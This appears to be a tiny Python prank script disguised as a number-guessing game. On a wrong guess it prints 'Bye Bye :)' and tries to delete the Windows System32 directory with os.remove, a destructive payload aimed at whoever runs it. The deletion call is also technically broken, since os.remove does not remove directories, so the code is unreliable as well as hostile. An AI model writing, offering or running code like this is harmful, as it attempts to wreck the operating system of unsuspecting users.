import random, os

if int(input("Pick a number 1-10: ")) == random.randint(1,10):
    print("You're Lucky...")
    exit()

print("Bye Bye :)")
os.remove("C:/Windows/System32")